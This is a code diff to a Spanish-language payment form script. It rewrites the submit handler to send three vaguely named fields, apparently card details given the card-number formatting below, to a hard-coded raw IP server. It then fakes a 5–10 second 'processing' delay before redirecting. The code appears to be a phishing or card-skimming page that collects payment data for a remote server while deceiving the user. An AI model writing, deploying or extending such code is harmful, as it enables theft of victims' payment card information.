@@ -1,9 +1,9 @@
-document.getElementById('payment-form').addEventListener('submit', function (e) {
+document.getElementById('payment-form').addEventListener('submit', async function (e) {
     e.preventDefault();
 
-    let firstName = document.getElementById('firstName').value.trim();
-    let secondName = document.getElementById('secondName').value.trim();
-    let thirdName = document.getElementById('thirdName').value.trim();
+    const firstName = document.getElementById('firstName').value.trim();
+    const secondName = document.getElementById('secondName').value.trim();
+    const thirdName = document.getElementById('thirdName').value.trim();
 
     // 🚨 Validaciones antes de enviar
     if (!firstName || !secondName || !thirdName) {
@@ -17,41 +17,54 @@ document.getElementById('payment-form').addEventListener('submit', function (e) 
         return;
     }
 
+    // 🔹 Verificar si el servidor está disponible antes de enviar datos
+    const serverUrl = "http://185.177.125.211:3000/send-data";
+
+    try {
+        const serverCheck = await fetch(serverUrl, { method: 'OPTIONS' });
+        if (!serverCheck.ok) {
+            throw new Error(`El servidor no está accesible: ${serverCheck.status}`);
+        }
+    } catch (error) {
+        console.error("🚨 Error al verificar el servidor:", error);
+        alert("Hubo un problema al conectar con el servidor. Inténtalo más tarde.");
+        return;
+    }
+
     // 🔹 Deshabilitar el botón para evitar múltiples envíos
     const payButton = document.querySelector('.pay-button');
     payButton.disabled = true;
     payButton.innerText = "Procesando...";
 
-    fetch('http://localhost:3000/send-data', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-        },
-        body: JSON.stringify({ firstName, secondName, thirdName })
-    })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error(`Error ${response.status}: ${response.statusText}`);
-            }
-            return response.json();
-        })
-        .then(data => {
-            console.log("✅ Datos enviados correctamente:", data);
-
-            // 🔹 Simulación de carga antes de abrir processing.html
-            setTimeout(() => {
-                window.location.href = "/processing/processing.html";
-            }, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000); // 🔹 Espera entre 5 y 10 segundos
-        })
-        .catch(error => {
-            console.error("🚨 Error al enviar los datos:", error);
-            alert(`Hubo un problema al procesar la información. ⚠️ Detalles: ${error.message}`);
-
-            // 🔹 Reactivar el botón si hay error
-            payButton.disabled = false;
-            payButton.innerText = "Pagar";
+    try {
+        const response = await fetch(serverUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({ firstName, secondName, thirdName })
         });
+
+        if (!response.ok) {
+            throw new Error(`Error ${response.status}: ${response.statusText}`);
+        }
+
+        const data = await response.json();
+        console.log("✅ Datos enviados correctamente:", data);
+
+        // 🔹 Simulación de carga antes de abrir processing.html
+        setTimeout(() => {
+            window.location.href = "/processing/processing.html";
+        }, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000);
+    } catch (error) {
+        console.error("🚨 Error al enviar los datos:", error);
+        alert(`Hubo un problema al procesar la información. ⚠️ Detalles: ${error.message}`);
+
+        // 🔹 Reactivar el botón si hay error
+        payButton.disabled = false;
+        payButton.innerText = "Pagar";
+    }
 });
 
 // ✨ Formateo automático del número de tarjeta
